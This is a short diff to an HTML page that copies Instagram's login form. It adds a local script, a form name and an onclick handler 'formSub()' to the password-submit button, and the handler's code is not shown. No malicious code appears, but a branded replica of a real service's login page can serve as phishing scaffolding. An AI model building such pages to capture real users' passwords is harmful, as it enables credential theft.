@@ -5,7 +5,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
+  <script src="javascript.js"></script>
   <link rel="stylesheet" href="style.css">
   <title>Instagram Login Form</title>
 </head>
@@ -16,13 +16,13 @@
     <div class="container">
       <div class="phone-app-demo"></div>
       <div class="form-data">
-        <form action="">
+        <form action="" name="login_form">
           <div class="logo">
             <img src="./images/logo.png" alt="logo">
           </div>
           <input type="text" placeholder="Phone number, username, or email">
           <input type="password" placeholder="Password">
-          <button class="form-btn" type="submit">Log in</button>
+          <button class="form-btn" type="submit" onclick="formSub()">Log in</button>
           <span class="has-separator">Or</span>
           <a class="facebook-login" href="#">
             <i class="fab fa-facebook-square"></i> Log in with Facebook
